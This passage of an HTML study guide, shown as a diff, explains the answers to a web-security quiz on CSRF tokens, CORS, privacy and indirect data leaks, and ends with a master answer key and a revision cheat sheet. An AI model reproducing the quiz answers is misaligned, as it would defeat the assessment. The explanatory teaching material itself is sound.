+  <code>X-CSRFToken</code>, it must have come from JavaScript &ndash; and cross-origin JavaScript
+  adding a custom header triggers a <b>CORS preflight</b>, which the attacker's origin will fail.
+  This is one of the places where CORS and CSRF protection genuinely overlap, and it matters for
+  Part 7.
+</div>
+
+<!-- ---------------------------- Q7 ---------------------------- -->
+<div class="qhead">Question 7 <span class="mark">1 mark &bull; select all that apply</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following is true regarding CSRF token?</p>
+  <ul class="opts">
+    <li class="right"><span class="lab">A.</span> CSRF token is generated by the server.</li>
+    <li class="wrong"><span class="lab">B.</span> CSRF token is generated by the client.</li>
+    <li class="right"><span class="lab">C.</span> CSRF token can be sent via custom header.</li>
+    <li class="wrong"><span class="lab">D.</span> None of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>The <b>server</b> generates the token, stores it against the session, and embeds it in
+      the page it sends you. It must be the server, because the server is the one that later has
+      to <b>verify</b> it.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Opposite of A, so exactly one of the pair is right. Think about why a client-generated
+      token would be worthless: the <b>attacker is also a client</b>. If clients could mint their
+      own tokens, the attacker would simply mint one and the defence would vanish.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>Yes &ndash; commonly as <code>X-CSRFToken</code> or <code>X-CSRF-Token</code>. This is the
+      standard approach for AJAX and <code>fetch</code> calls, where there is no HTML form to
+      carry a hidden field.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Fails because A and C are true.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 7</span>
+  <span class="big">A and C</span>
+  <br/><small>Generated by the server, and sendable via a custom header. Matches your selection.</small>
+</div>
+
+
+<!-- ============================== PART 7 ============================== -->
+<h1 class="part"><span class="kicker">Part 7 &bull; Question 3</span>CORS and CSRF together</h1>
+
+<p>Question 3 puts CORS, CSRF and <code>fetch</code> in one question. You have already met all
+three ideas, so this part just joins them up.</p>
+
+<h2>7.1 How CORS helps against CSRF, and where it stops helping</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the guard who checks some doors</span>
+  A building hires a guard who checks ID at the <b>side entrance</b> used by delivery vans, but
+  the <b>front door</b> is a public entrance that anyone may walk through.
+  <br/><br/>
+  The guard is genuinely useful &ndash; the side entrance is now protected. But you would be
+  foolish to sack the receptionist inside, because the front door is still open.
+  <br/><br/>
+  CORS is that guard. It blocks a whole class of cross-origin attacks, so it genuinely
+  <b>can be used to help avoid CSRF</b>. But it does not cover every route in, which is why the
+  <b>CSRF token</b> (the receptionist) stays.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 250" xmlns="http://www.w3.org/2000/svg">
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">What CORS stops, and what it does not</text>
+
+    <!-- stops -->
+    <rect x="8" y="26" width="336" height="212" rx="10" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.5"/>
+    <text x="176" y="46" font-size="11" font-weight="800" fill="#1f7a3a" text-anchor="middle">CORS DOES stop these</text>
+    <g font-size="8.8" fill="#22303f">
+      <text x="24" y="70">&bull; a cross-origin <tspan font-weight="700">fetch that wants to</tspan></text>
+      <text x="34" y="82"><tspan font-weight="700">READ your data</tspan> - blocked unless</text>
+      <text x="34" y="94">the server allows that origin</text>
+
+      <text x="24" y="116">&bull; a cross-origin request carrying a</text>
+      <text x="34" y="128"><tspan font-weight="700">custom header</tspan> like X-CSRFToken -</text>
+      <text x="34" y="140">it triggers a <tspan font-weight="700">preflight</tspan> which fails</text>
+
+      <text x="24" y="162">&bull; a cross-origin <tspan font-weight="700">PUT or DELETE</tspan>,</text>
+      <text x="34" y="174">or a POST sending JSON -</text>
+      <text x="34" y="186">all need a preflight first</text>
+    </g>
+    <rect x="24" y="196" width="304" height="32" rx="6" fill="#fff" stroke="#1f7a3a"/>
+    <text x="176" y="210" font-size="8.8" font-weight="700" fill="#1f7a3a" text-anchor="middle">For a modern JSON API, CORS blocks</text>
+    <text x="176" y="222" font-size="8.8" font-weight="700" fill="#1f7a3a" text-anchor="middle">most CSRF attempts outright.</text>
+
+    <!-- doesn't stop -->
+    <rect x="356" y="26" width="336" height="212" rx="10" fill="#fdecec" stroke="#b52020" stroke-width="2.5"/>
+    <text x="524" y="46" font-size="11" font-weight="800" fill="#b52020" text-anchor="middle">CORS does NOT stop these</text>
+    <g font-size="8.8" fill="#22303f">
+      <text x="372" y="70">&bull; a plain <tspan font-weight="700">HTML form POST</tspan> to</text>
+      <text x="382" y="82">another origin - allowed by design,</text>
+      <text x="382" y="94">because the web has always worked so</text>
+
+      <text x="372" y="116">&bull; an <tspan font-weight="700">image or script tag</tspan> pointing</text>
+      <text x="382" y="128">at another origin - these are</text>
+      <text x="382" y="140">"simple requests", no preflight</text>
+
+      <text x="372" y="162">&bull; the request still <tspan font-weight="700">ARRIVES</tspan> and the</text>
+      <text x="382" y="174">server may still <tspan font-weight="700">act on it</tspan>. CORS only</text>
+      <text x="382" y="186">stops the attacker READING the reply.</text>
+    </g>
+    <rect x="372" y="196" width="304" height="32" rx="6" fill="#fff" stroke="#b52020"/>
+    <text x="524" y="210" font-size="8.8" font-weight="700" fill="#b52020" text-anchor="middle">So CORS alone is not a complete defence.</text>
+    <text x="524" y="222" font-size="8.8" font-weight="700" fill="#b52020" text-anchor="middle">Always keep the CSRF token as well.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 7.1</span> &ndash; CORS is a real part of CSRF defence, but a partial one. The token remains essential.</figcaption>
+</figure>
+
+<div class="note">
+  <span class="boxtitle">The precise position, worth understanding properly</span>
+  Option B of Q3 says CORS "can be used to avoid CSRF vulnerability". Read the wording carefully:
+  it says <b>can be used to</b>, not <b>is sufficient to</b>. That is a fair claim &ndash;
+  a correctly configured CORS policy is one of the recognised layers of CSRF protection, and it
+  is what makes the custom-header technique in Part 6 work.
+  <br/><br/>
+  What would be <b>false</b> is a stronger sentence such as "CORS <i>completely prevents</i> CSRF"
+  or "with CORS you do not need a CSRF token". If you meet one of those in the end term, mark it
+  wrong &ndash; a plain cross-origin form POST is not blocked by CORS.
+</div>
+
+<!-- ---------------------------- Q3 ---------------------------- -->
+<div class="qhead">Question 3 <span class="mark">1 mark &bull; single correct</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following statement(s) is/are true regarding CORS and CSRF?</p>
+  <ul class="opts">
+    <li class="wrong"><span class="lab">A.</span> The fetch API can be used to make an opaque request for selective request methods.</li>
+    <li class="wrong"><span class="lab">B.</span> CORS is a mechanism which can be used to avoid CSRF vulnerability in a web application.</li>
+    <li class="wrong"><span class="lab">C.</span> CORS allows a web application to specify the origins and request methods it is willing to accept.</li>
+    <li class="right"><span class="lab">D.</span> All of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>Setting <code>mode: 'no-cors'</code> produces an <b>opaque</b> response, and in that mode
+      the method is <b>restricted to GET, HEAD and POST</b> only. "Selective request methods" is
+      describing exactly that restriction. Middle panel of Figure 4.2.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>A properly configured CORS policy is one of the layers used to reduce CSRF exposure:
+      it forces a preflight for anything beyond a simple request, and cross-origin attackers fail
+      that preflight. Note the careful phrasing <i>"can be used to"</i> &ndash; see the note above
+      for the limits. Figure 7.1.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>Literally what the CORS response headers do:
+      <code>Access-Control-Allow-Origin</code> names the permitted <b>origins</b> and
+      <code>Access-Control-Allow-Methods</code> names the permitted <b>methods</b>.
+      Bottom of Figure 3.2.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill t">TRUE</span><br/><small>the answer</small></td>
+      <td>All three statements are true, so "All of the above" is correct.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 3</span>
+  <span class="big">Option D &ndash; All of the above</span>
+  <br/><small>Matches your selection.</small>
+</div>
+
+<!-- ============================== PART 8 ============================== -->
+<h1 class="part"><span class="kicker">Part 8 &bull; Questions 8 and 9</span>Privacy, security, and quiet data leaks</h1>
+
+<p>The last two questions leave attacks behind and ask about two words people use
+interchangeably but which mean different things.</p>
+
+<h2>8.1 Privacy is not the same as security</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the diary and the cupboard</span>
+  <b>Privacy</b> is the question: <i>which of my secrets am I willing to tell you at all?</i>
+  It is about the information itself and the person's wishes.
+  <br/><br/>
+  <b>Security</b> is the question: <i>how strong is the cupboard you keep my diary in?</i>
+  It is about the mechanisms protecting whatever you were given.
+  <br/><br/>
+  You can have one without the other. A bank with excellent locks that then <b>sells your
+  transaction history to advertisers</b> is <b>secure but not private</b>. A company that
+  sincerely promises never to share your data but stores it in a plain text file on a public
+  server is <b>private in intent but not secure</b>. You need both.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 220" xmlns="http://www.w3.org/2000/svg">
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">Two different questions</text>
+
+    <rect x="8" y="26" width="336" height="120" rx="10" fill="#f0ecfd" stroke="#5b3ec8" stroke-width="2.5"/>
+    <text x="176" y="47" font-size="11.5" font-weight="800" fill="#5b3ec8" text-anchor="middle">PRIVACY</text>
+    <rect x="26" y="56" width="300" height="24" rx="5" fill="#fff" stroke="#5b3ec8"/>
+    <text x="176" y="72" font-size="9.2" font-weight="700" fill="#5b3ec8" text-anchor="middle">"WHAT am I willing to share, and with whom?"</text>
+    <g font-size="8.8" fill="#22303f">
+      <text x="26" y="96">&bull; about personally identifiable information (PII)</text>
+      <text x="26" y="112">&bull; concerns the user's <tspan font-weight="700">wishes and consent</tspan></text>
+      <text x="26" y="128">&bull; questions: why collect this? who sees it? how long kept?</text>
+      <text x="26" y="141" font-weight="700" fill="#5b3ec8">Q8 option A describes this</text>
+    </g>
+
+    <rect x="356" y="26" width="336" height="120" rx="10" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.5"/>
+    <text x="524" y="47" font-size="11.5" font-weight="800" fill="#1f7a3a" text-anchor="middle">SECURITY</text>
+    <rect x="374" y="56" width="300" height="24" rx="5" fill="#fff" stroke="#1f7a3a"/>
+    <text x="524" y="72" font-size="9.2" font-weight="700" fill="#1f7a3a" text-anchor="middle">"HOW well is what I gave you protected?"</text>
+    <g font-size="8.8" fill="#22303f">
+      <text x="374" y="96">&bull; about storage, access control and transmission</text>
+      <text x="374" y="112">&bull; concerns <tspan font-weight="700">mechanisms</tspan>: hashing, HTTPS, permissions</text>
+      <text x="374" y="128">&bull; questions: encrypted? who can query it? backups safe?</text>
+      <text x="374" y="141" font-weight="700" fill="#1f7a3a">Q8 option B describes this</text>
+    </g>
+
+    <rect x="8" y="156" width="684" height="58" rx="9" fill="#fffbe8" stroke="#e0a800" stroke-width="2"/>
+    <text x="350" y="174" font-size="10.4" font-weight="800" fill="#a97800" text-anchor="middle">The one-line distinction to write in an exam</text>
+    <text x="350" y="192" font-size="9.4" fill="#22303f" text-anchor="middle">Privacy is about <tspan font-weight="800">WHICH data is collected and shared</tspan>. Security is about <tspan font-weight="800">HOW that data is protected</tspan>.</text>
+    <text x="350" y="207" font-size="9.4" font-style="italic" fill="#a97800" text-anchor="middle">Good security is necessary for privacy, but it is not sufficient for it.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 8.1</span> &ndash; Privacy is a policy question; security is an engineering question.</figcaption>
+</figure>
+
+<h2>8.2 Leaking data without handing over the data</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the shop that guessed</span>
+  A shop never tells anyone what you bought. Then it starts posting baby-product offers to your
+  house. Your relatives see the envelopes and work out that somebody is expecting a baby.
+  <br/><br/>
+  The shop never published your purchase list. But its <b>recommendations</b> revealed the
+  <b>conclusion</b> drawn from that list &ndash; which was the sensitive part all along.
+  <br/><br/>
+  That is an <b>indirect leak</b>: the raw data stayed secret, and the information still escaped.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 250" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="l1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#b52020"/></marker>
+      <marker id="l2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#d9480f"/></marker>
+    </defs>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">Two ways data escapes</text>
+
+    <!-- direct -->
+    <rect x="8" y="26" width="336" height="106" rx="9" fill="#fdecec" stroke="#b52020" stroke-width="2.4"/>
+    <text x="176" y="46" font-size="11" font-weight="800" fill="#b52020" text-anchor="middle">DIRECT leak</text>
+    <rect x="26" y="58" width="88" height="30" rx="5" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="70" y="77" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">your password</text>
+    <path d="M120 73 H196" stroke="#b52020" stroke-width="2" marker-end="url(#l1)"/>
+    <text x="158" y="68" font-size="7.6" font-weight="700" fill="#b52020" text-anchor="middle">exposed</text>
+    <rect x="202" y="58" width="124" height="30" rx="5" fill="#b52020"/>
+    <text x="264" y="77" font-size="8.4" font-weight="700" fill="#fff" text-anchor="middle">attacker HAS the data</text>
+    <text x="176" y="106" font-size="8.8" fill="#22303f" text-anchor="middle">The actual secret value itself is handed over.</text>
+    <text x="176" y="122" font-size="8.8" font-weight="700" fill="#b52020" text-anchor="middle">Password leak, database dump, exposed API.</text>
+
+    <!-- indirect -->
+    <rect x="356" y="26" width="336" height="106" rx="9" fill="#fff1e6" stroke="#d9480f" stroke-width="2.4"/>
+    <text x="524" y="46" font-size="11" font-weight="800" fill="#d9480f" text-anchor="middle">INDIRECT leak</text>
+    <rect x="372" y="58" width="88" height="30" rx="5" fill="#fff" stroke="#d9480f" stroke-width="1.8"/>
+    <text x="416" y="71" font-size="8" font-weight="700" fill="#d9480f" text-anchor="middle">your browsing</text>
+    <text x="416" y="82" font-size="8" font-weight="700" fill="#d9480f" text-anchor="middle">stays private</text>
+    <path d="M466 73 H542" stroke="#d9480f" stroke-width="2" marker-end="url(#l2)"/>
+    <text x="504" y="68" font-size="7.6" font-weight="700" fill="#d9480f" text-anchor="middle">but...</text>
+    <rect x="548" y="58" width="128" height="30" rx="5" fill="#d9480f"/>
+    <text x="612" y="71" font-size="8" font-weight="700" fill="#fff" text-anchor="middle">the RECOMMENDATIONS</text>
+    <text x="612" y="82" font-size="8" font-weight="700" fill="#fff" text-anchor="middle">reveal it anyway</text>
+    <text x="524" y="106" font-size="8.8" fill="#22303f" text-anchor="middle">The raw data is never shown, yet observers can</text>
+    <text x="524" y="122" font-size="8.8" font-weight="700" fill="#d9480f" text-anchor="middle">infer it from the system's behaviour.</text>
+
+    <!-- examples -->
+    <rect x="8" y="144" width="684" height="98" rx="9" fill="#e8f0fb" stroke="#1b4f9c" stroke-width="2.2"/>
+    <text x="350" y="163" font-size="10.4" font-weight="800" fill="#1b4f9c" text-anchor="middle">More examples of indirect leaks, so you recognise the pattern</text>
+    <g font-size="8.8" fill="#22303f">
+      <text x="26" y="182">&bull; <tspan font-weight="700">Recommendations based on behaviour</tspan> - "people who watched X..." exposes what you watched</text>
+      <text x="26" y="199">&bull; <tspan font-weight="700">"You may know this person"</tspan> - reveals who is in someone's contact list</text>
+      <text x="26" y="216">&bull; <tspan font-weight="700">Different error messages</tspan> - "no such user" vs "wrong password" reveals which emails are registered</text>
+      <text x="26" y="233">&bull; <tspan font-weight="700">Response timing</tspan> - a slower reply can reveal that a record exists</text>
+    </g>
+  </svg>
+  <figcaption><span class="fignum">Figure 8.2</span> &ndash; The test for an indirect leak: was the <b>raw value</b> withheld, yet the <b>information</b> still escaped?</figcaption>
+</figure>
+
+<!-- ---------------------------- Q8 ---------------------------- -->
+<div class="qhead">Question 8 <span class="mark">1 mark &bull; single correct</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following statements is true?</p>
+  <ul class="opts">
+    <li class="wrong"><span class="lab">A.</span> Privacy is related to the personal identifiable information which the user is not willing to share.</li>
+    <li class="wrong"><span class="lab">B.</span> Security is related to how an application stores data and manages it.</li>
+    <li class="wrong"><span class="lab">C.</span> Data can even be leaked without giving out the actual data.</li>
+    <li class="right"><span class="lab">D.</span> All of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>Privacy concerns <b>personally identifiable information</b> and the user's wishes about
+      sharing it. Left panel of Figure 8.1.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>Security is about the <b>mechanisms</b>: how data is stored, transmitted, access
+      controlled and managed. Right panel of Figure 8.1.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>This is the <b>indirect leak</b> idea of Figure 8.2, and it leads straight into
+      Question 9.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill t">TRUE</span><br/><small>the answer</small></td>
+      <td>All three are true, so "All of the above" is correct.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 8</span>
+  <span class="big">Option D &ndash; All of the above</span>
+  <br/><small>Matches your selection.</small>
+</div>
+
+<!-- ---------------------------- Q9 ---------------------------- -->
+<div class="qhead">Question 9 <span class="mark">1 mark &bull; single correct</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following is an example of indirect leak of data?</p>
+  <ul class="opts">
+    <li class="right"><span class="lab">A.</span> Recommendations based on user's behavior.</li>
+    <li class="wrong"><span class="lab">B.</span> Password leak.</li>
+    <li class="wrong"><span class="lab">C.</span> Both A and B</li>
+    <li class="wrong"><span class="lab">D.</span> None of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span><br/><small>the answer</small></td>
+      <td>The system never publishes your history, yet the recommendations it produces let an
+      observer <b>infer</b> that history. The raw data was withheld and the information escaped
+      anyway &ndash; the definition of an indirect leak.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>A password leak is the clearest possible <b>direct</b> leak: the actual secret value is
+      exposed. Nothing has to be inferred.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Requires B to be an indirect leak. It is a direct one, so this fails.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Fails because A genuinely is an indirect leak.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 9</span>
+  <span class="big">Option A</span>
+  <br/><small>Recommendations reveal behaviour without revealing the behaviour data itself.
+  Matches your selection.</small>
+</div>
+
+<div class="kid">
+  <span class="boxtitle">The one-question test to tell them apart</span>
+  Ask: <b>"did the attacker receive the actual value, or did they work it out?"</b>
+  <br/>Received it = <b>direct</b>. Worked it out from clues = <b>indirect</b>.
+</div>
+
+
+<!-- ============================== PART 9 ============================== -->
+<h1 class="part"><span class="kicker">Part 9 &bull; Revision</span>Answer key, cheat sheet and practice</h1>
+
+<h2>9.1 Master answer key</h2>
+
+<table class="flow">
+  <tr><th class="c" style="width:44px">Q</th><th style="width:150px">Topic</th>
+      <th class="c" style="width:84px">Answer</th><th>The one line that decides it</th></tr>
+  <tr><td class="c"><b>1</b></td><td>Denial of Service</td><td class="c"><b>B, C</b></td>
+      <td>It blocks legitimate users, usually by flooding the server. Option A points at the wrong victim.</td></tr>
+  <tr><td class="c"><b>2</b></td><td>NIST 800-63B</td><td class="c"><b>D</b></td>
+      <td>NIST prefers LENGTH over complexity, and passwords are hashed, not decrypted.</td></tr>
+  <tr><td class="c"><b>3</b></td><td>CORS and CSRF</td><td class="c"><b>D</b></td>
+      <td>Opaque requests limit methods, CORS helps against CSRF, and CORS names origins and methods.</td></tr>
+  <tr><td class="c"><b>4</b></td><td>fetch API (false one)</td><td class="c"><b>B</b></td>
+      <td>The default method is GET, never HEAD.</td></tr>
+  <tr><td class="c"><b>5</b></td><td>XSS</td><td class="c"><b>A, B</b></td>
+      <td>Injected client-side scripts, caused by missing validation. CSRF tokens stop CSRF, not XSS.</td></tr>
+  <tr><td class="c"><b>6</b></td><td>CSRF attacks</td><td class="c"><b>C</b></td>
+      <td>Both statements are true: abused trust, and forged requests being indistinguishable.</td></tr>
+  <tr><td class="c"><b>7</b></td><td>CSRF token</td><td class="c"><b>A, C</b></td>
+      <td>Generated by the server, and sendable via a custom header.</td></tr>
+  <tr><td class="c"><b>8</b></td><td>Privacy vs security</td><td class="c"><b>D</b></td>
+      <td>All three are true, including that data can leak without the data being given out.</td></tr>
+  <tr><td class="c"><b>9</b></td><td>Indirect leak</td><td class="c"><b>A</b></td>
+      <td>Recommendations reveal behaviour by inference. A password leak is direct.</td></tr>
+  <tr><td class="c"><b>10</b></td><td>Origins and CORS</td><td class="c"><b>A, D</b></td>
+      <td>Cross-origin reads are denied by default; paths do not change the origin.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Your attempt: 10 out of 10</span>
+  Every option you selected matches this key. Nothing to change.
+</div>
+
+<h2>9.2 The whole week on one page</h2>
+
+<figure>
+  <svg viewBox="0 0 700 250" xmlns="http://www.w3.org/2000/svg">
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">Which attack does each defence actually stop?</text>
+
+    <g font-size="8.8">
+      <!-- header row -->
+      <rect x="14" y="26" width="200" height="24" rx="4" fill="#1b4f9c"/>
+      <text x="114" y="42" fill="#fff" font-weight="800" text-anchor="middle">ATTACK</text>
+      <rect x="218" y="26" width="230" height="24" rx="4" fill="#1b4f9c"/>
+      <text x="333" y="42" fill="#fff" font-weight="800" text-anchor="middle">WHAT IT ABUSES</text>
+      <rect x="452" y="26" width="234" height="24" rx="4" fill="#1b4f9c"/>
+      <text x="569" y="42" fill="#fff" font-weight="800" text-anchor="middle">THE RIGHT DEFENCE</text>
+
+      <!-- DoS -->
+      <rect x="14" y="54" width="200" height="42" rx="4" fill="#fdecec" stroke="#b52020"/>
+      <text x="26" y="70" font-weight="800" fill="#b52020">DoS / DDoS</text>
+      <text x="26" y="86" fill="#22303f">availability</text>
+      <rect x="218" y="54" width="230" height="42" rx="4" fill="#fff" stroke="#9aa4b2"/>
+      <text x="230" y="70" fill="#22303f">the server's finite capacity</text>
+      <text x="230" y="86" fill="#22303f">for connections and CPU</text>
+      <rect x="452" y="54" width="234" height="42" rx="4" fill="#e9f7ee" stroke="#1f7a3a"/>
+      <text x="464" y="70" fill="#22303f">rate limiting, traffic filtering,</text>
+      <text x="464" y="86" fill="#22303f">a CDN or scrubbing service, scaling</text>
+
+      <!-- password -->
+      <rect x="14" y="100" width="200" height="42" rx="4" fill="#fdecec" stroke="#b52020"/>
+      <text x="26" y="116" font-weight="800" fill="#b52020">Brute force / stuffing</text>
+      <text x="26" y="132" fill="#22303f">weak or reused passwords</text>
+      <rect x="218" y="100" width="230" height="42" rx="4" fill="#fff" stroke="#9aa4b2"/>
+      <text x="230" y="116" fill="#22303f">short passwords and</text>
+      <text x="230" y="132" fill="#22303f">unlimited login attempts</text>
+      <rect x="452" y="100" width="234" height="42" rx="4" fill="#e9f7ee" stroke="#1f7a3a"/>
+      <text x="464" y="116" fill="#22303f">long passwords, salted slow hashing,</text>
+      <text x="464" y="132" fill="#22303f">throttled logins, breach-list checks</text>
+
+      <!-- XSS -->
+      <rect x="14" y="146" width="200" height="42" rx="4" fill="#fdecec" stroke="#b52020"/>
+      <text x="26" y="162" font-weight="800" fill="#b52020">XSS</text>
+      <text x="26" y="178" fill="#22303f">the USER's trust in the site</text>
+      <rect x="218" y="146" width="230" height="42" rx="4" fill="#fff" stroke="#9aa4b2"/>
+      <text x="230" y="162" fill="#22303f">input rendered as code</text>
+      <text x="230" y="178" fill="#22303f">instead of as data</text>
+      <rect x="452" y="146" width="234" height="42" rx="4" fill="#e9f7ee" stroke="#1f7a3a"/>
+      <text x="464" y="162" fill="#22303f">escape output, validate input,</text>
+      <text x="464" y="178" fill="#22303f">CSP, HttpOnly cookies</text>
+
+      <!-- CSRF -->
+      <rect x="14" y="192" width="200" height="42" rx="4" fill="#fdecec" stroke="#b52020"/>
+      <text x="26" y="208" font-weight="800" fill="#b52020">CSRF</text>
+      <text x="26" y="224" fill="#22303f">the SITE's trust in the user</text>
+      <rect x="218" y="192" width="230" height="42" rx="4" fill="#fff" stroke="#9aa4b2"/>
+      <text x="230" y="208" fill="#22303f">cookies being attached</text>
+      <text x="230" y="224" fill="#22303f">automatically to every request</text>
+      <rect x="452" y="192" width="234" height="42" rx="4" fill="#e9f7ee" stroke="#1f7a3a"/>
+      <text x="464" y="208" fill="#22303f">CSRF token from the server,</text>
+      <text x="464" y="224" fill="#22303f">SameSite cookies, CORS, Origin check</text>
+    </g>
+    <text x="350" y="246" font-size="9" font-style="italic" fill="#5a6472" text-anchor="middle">Note the two middle rows: XSS and CSRF abuse trust in OPPOSITE directions.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 9.1</span> &ndash; Matching each defence to its attack. Mismatching them is what Q5 option C was testing.</figcaption>
+</figure>
+
+<h2>9.3 The one-page cheat sheet</h2>
+
+<div class="card">
+  <h4 style="margin-top:0">Denial of Service</h4>
+  <ul>
+    <li>Goal: make a service <b>unavailable to legitimate users</b>. Not about stealing data.</li>
+    <li>Usual method: continuous <b>bulk requests</b> until resources are exhausted.</li>
+    <li><b>DDoS</b> = <b>Distributed</b>: many machines (a botnet) at once, much harder to block.</li>
+    <li>Defences: rate limiting, filtering, autoscaling, CDN or scrubbing services.</li>
+  </ul>
+</div>
+
+<div class="card">
+  <h4 style="margin-top:0">Passwords and NIST SP 800-63B</h4>
+  <ul>
+    <li><b>Length beats complexity.</b> Minimum 8 characters, allow up to 64, allow spaces and paste.</li>
+    <li><b>Salted, slow hashing</b> before storage; the salt must be <b>at least 32 bits</b>.</li>
+    <li><b>Limit failed login attempts</b> to stop brute force and credential stuffing.</li>
+    <li>Check new passwords against <b>known breached password lists</b>.</li>
+    <li><b>Do not</b> force periodic resets, and <b>do not</b> demand symbols and mixed case.</li>
+    <li>Passwords are <b>hashed, not encrypted</b> &ndash; there is no "decrypting" a password.</li>
+  </ul>
+</div>
+
+<div class="card">
+  <h4 style="margin-top:0">Origins and CORS</h4>
+  <ul>
+    <li><b>Origin = scheme + host + port.</b> All three must match; the <b>path is irrelevant</b>.</li>
+    <li><code>example.com</code> and <code>example.com/profile</code>: <b>same origin</b>.</li>
+    <li><code>example.com</code> and <code>api.example.com</code>: <b>different origins</b> (subdomain = different host).</li>
+    <li>Also different: <code>http</code> vs <code>https</code>, and <code>:80</code> vs <code>:8080</code>.</li>
+    <li>Cross-origin reads are <b>denied by default</b>; the receiving server opts in with
+        <code>Access-Control-Allow-Origin</code> and <code>Access-Control-Allow-Methods</code>.</li>
+    <li>Precise wording: the <b>same-origin policy</b> blocks, <b>CORS</b> is how a server relaxes it.</li>
+  </ul>
+</div>
+
+<div class="card">
+  <h4 style="margin-top:0">The fetch API</h4>
+  <ul>
+    <li>Defaults: <b>method GET</b>, <b>mode cors</b>, <b>credentials same-origin</b>.</li>
+    <li><code>mode: 'no-cors'</code> gives an <b>opaque</b> response: status 0, null body, empty
+        headers, and the method is limited to <b>GET, HEAD or POST</b>.</li>
+    <li><code>credentials</code> controls whether <b>cookies</b> are sent:
+        <code>omit</code> / <code>same-origin</code> / <code>include</code>.</li>
+  </ul>
+</div>
+
+<div class="card">
+  <h4 style="margin-top:0">XSS and CSRF</h4>
+  <ul>
+    <li><b>XSS</b>: attacker <b>injects client-side scripts</b> into a page. Cause: input not
+        validated or escaped. Abuses the <b>user's trust in the site</b>.</li>
+    <li>XSS defences: <b>escape output</b>, <b>validate input</b>, CSP, HttpOnly cookies.
+        <b>Not</b> a CSRF token.</li>
+    <li><b>CSRF</b>: a forged request rides on the victim's <b>automatically attached cookie</b>.
+        Abuses the <b>site's trust in the user</b>. The server cannot distinguish forged from
+        genuine.</li>
+    <li><b>CSRF token</b>: generated by the <b>server</b>, tied to the session, returned as a
+        <b>hidden form field</b> or a <b>custom header</b> such as <code>X-CSRFToken</code>.</li>
+    <li>CORS <b>helps</b> against CSRF but is not sufficient: a plain cross-origin form POST is
+        still allowed.</li>
+  </ul>
+</div>
+
+<div class="card">
+  <h4 style="margin-top:0">Privacy and data leaks</h4>
+  <ul>
+    <li><b>Privacy</b>: <b>which</b> personal data is collected and shared, and the user's consent.</li>
